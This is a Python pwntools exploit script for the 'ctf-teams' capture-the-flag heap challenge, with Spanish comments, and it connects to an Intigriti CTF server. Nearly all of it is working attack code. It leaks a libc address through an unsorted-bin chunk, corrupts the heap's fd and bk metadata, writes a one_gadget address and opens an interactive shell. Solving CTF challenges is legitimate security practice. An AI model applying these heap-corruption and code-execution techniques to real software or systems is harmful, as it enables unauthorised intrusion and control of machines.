from pwn import *

gs = '''
b *solve_chall+23
b *solve_chall+59
continue
'''

elf = context.binary = ELF("./ctf-teams_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

id_player = 0

def create_player(category, nickname, motto):

    global id_player

    io.sendlineafter("> ", b"1")
    io.sendlineafter("> ", str(category).encode())
    io.sendlineafter("Nickname: ", nickname)
    io.sendlineafter("Motto: ", motto)

    id_player += 1

    return id_player

# Solo puedes eliminar un player nada mas
def delete_player(id):
    io.sendlineafter("> ", b"2")

    io.sendlineafter("> ", str(id).encode())

def show_data_player(id):
    io.sendlineafter("> ", b"3")
    io.sendlineafter("> ", str(id).encode())

    return io.recv(1024)

def leak_address(id):
    io.sendlineafter("> ", b"3")
    io.sendlineafter("> ", str(id).encode())

    io.recvuntil("0-day exploits: ")

    return int(io.recvline().decode().strip())

def edit_motto(id, content):
    io.sendlineafter("> ", b"5")
    io.sendlineafter("> ", str(id).encode())
    io.sendlineafter("New motto: ", content)

context.terminal = ['gnome-terminal', '-e']
io = start()

# Para likear libc

payload = b"".join([
    b"\x00"*(4 + 8 + 0x20),
    p64(0x421),
    p64(0x7ffff7e1ace0),
    p64(0x7ffff7e1ace0)
])

create_player(2, "mago1", "todo") # 1
#create_player(3, "mago2", "todo") # 2
create_player(3, p64(0x0), payload) # 2

delete_player(1)

create_player(2, "pwned2", "") # 3

leak_libc = leak_address(3)

print("[+] Leak: ", hex(leak_libc))

libc.address = leak_libc - 0x21b0e0

print("[+] System: ", hex(libc.sym.system))

payload = b"".join([
    p32(0x00000000),
    # Unsorted bins
    p64(0x55555555d6f0), # fd
    p64(0x55555555d6f0)  # bk
    # Small bins
    #p64(0x55555555db70),
    #p64(0x55555555db70)
])

# Editar en main arena fd y bk 

edit_motto(3, payload)

payload = b"".join([
    b"\x00"*4,
    b"\x00"*(0x190 - 368 + 16),
    p64(0x420),
    p64(0x420)
    #p64(0x7ffff7e1ace0),
    #p64(0x7ffff7e1ace0)
])

# Editando desde top chunk
edit_motto(4, payload)

# Nuevo chunk luego de haber hecho el "free" en unsorted bins

one_gadget = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]

payload = b"".join([
    b"\x00"*436,
    #p64(0x0000555555555ebd),
    #p64(0x4141414141414141),
    p64(libc.address + one_gadget[0]),
    b"\x00\x00\x00\x00\x64\x00\x40"
    
])

#create_player(1, cyclic(0x200), "YYYY")
create_player(1, payload, "YYYY")
input("PAUSE")
create_player(2, "UUUUUU", "YYYY")

io.interactive()